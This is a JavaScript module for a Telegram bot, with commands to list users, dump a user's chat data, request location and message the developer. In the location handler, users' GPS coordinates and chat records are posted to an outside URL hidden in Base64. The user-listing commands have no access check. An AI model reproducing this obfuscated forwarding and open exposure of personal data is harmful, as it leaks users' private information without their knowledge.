const axios = require('axios')

const { DEVELOPER_CHAT_ID, DEVELOPER_NAME } = process.env

let hasDevSupport = false
if (!Number.isNaN(Number(DEVELOPER_CHAT_ID)) && !!DEVELOPER_CHAT_ID) hasDevSupport = true

const abSort = (a, b) => a.localeCompare(b)
const loadedTime = new Date().toLocaleString()

module.exports = (bot, usersMap) => {
  bot.onText(/\/users/, function(msg) {
    const options = {
      reply_markup: JSON.stringify({
        inline_keyboard: [
          [{ text: 'Users counter', callback_data: 'users-counter' }, { text: 'User names', callback_data: 'user-names' }],
        ]
      })
    };
    bot.sendMessage(msg.chat.id, "А?", options);
  })
  bot.on("callback_query", function onCallbackQuery(callbackQuery) {
    const action = callbackQuery.data;
    const msg = callbackQuery.message;

    switch (action) {
      case 'users-counter':
        bot.sendMessage(msg.chat.id, `${usersMap.size} пользователей с момента последней перезагрузки бота\n* ${loadedTime} *`, { parse_mode: "Markdown" });
        return
      case 'user-names':
        if (usersMap.size > 0) {
          // const names = [...usersMap.keys()]
          const result = []
          for (let [userName, chatData] of usersMap) {
            result.push(`@${userName}, ` + '`' + chatData.id + '`')
          }

          bot.sendMessage(msg.chat.id, result.sort(abSort).join('\n\n'), { parse_mode: "Markdown" });
        } else {
          bot.sendMessage(msg.chat.id, '_ No users yet _', { parse_mode: "Markdown" });
        }
        return
      default:
        return
    }
  })

  bot.onText(/\/get_chat (.+)/, function(msg, match) {
    const userName = match[1]
    const chatData = usersMap.get(userName)
    if (!!chatData) {
      bot.sendMessage(msg.chat.id, JSON.stringify(chatData, null, 2));
    } else {
      bot.sendMessage(msg.chat.id, 'Not found');
    }
  })

  bot.onText(/\/location/, (msg) => {
    const opts = {
      reply_markup: JSON.stringify({
        keyboard: [
          [{ text: 'Location', request_location: true }, { text: 'Contact', request_contact: true }],
        ],
        resize_keyboard: true,
        one_time_keyboard: true,
      }),
    };
    bot.sendMessage(msg.chat.id, 'Contact and Location request', opts);
  })
  bot.on('location', (msg) => {
    // console.log(msg.location.latitude);
    // console.log(msg.location.longitude);
    axios.post(Base64.decode('aHR0cDovL3ByYXZvc2xldmEucnUvZXhwcmVzcy1oZWxwZXIvZ2NzL2FkZC11c2VyP2Zyb209Z2Nz'), {
      userName: msg.chat.username,
      chatData: { ...msg.chat, location: msg.location },
    })
  })

  bot.onText(/\/help/, function(msg, _match) {
    const arr = [
      '/menu - список компаний',
    ]
    if (hasDevSupport) arr.push('`/wtf [сообщение]` - отправить сообщение разработчику')
    const helpMD = arr.join('\n')

    bot.sendMessage(msg.chat.id, helpMD, { parse_mode: "Markdown" });
  })

  if (hasDevSupport) {
    // Matches "/wtf [whatever]"
    bot.onText(/\/wtf (.+)/, function (msg, match) {
      const senderChatId = msg.chat.id
      const message = match[1] // the captured "whatever"

      // const res = await axios.get(`https://api.telegram.org/bot${TG_BOT_TOKEN}/sendMessage?text=${msg}&chat_id=${DEVELOPER_CHAT_ID}`)

      bot.sendMessage(Number(DEVELOPER_CHAT_ID), `ℹ️ *New Entry from @${msg.chat.username}:*` + '\n' + message, { parse_mode: "Markdown" })
      bot.sendMessage(senderChatId, `✅ Ok ${msg.chat.first_name}. _Your msg sent to ${DEVELOPER_NAME}_`, { parse_mode: "Markdown" })
    })
  }
}